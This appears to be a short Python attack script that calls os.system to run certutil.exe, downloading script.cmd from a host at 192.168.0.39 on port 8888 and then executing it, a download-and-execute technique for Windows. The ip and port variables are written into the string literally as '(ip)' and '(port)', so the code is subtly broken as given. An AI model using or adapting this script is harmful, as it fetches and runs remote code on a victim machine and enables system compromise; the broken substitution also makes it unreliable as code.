import os
ip = '192.168.0.39'
port = 8888
os.system('certutil.exe -urlcache -f http://(ip):(port)/script.cmd script.cmd & script.cmd')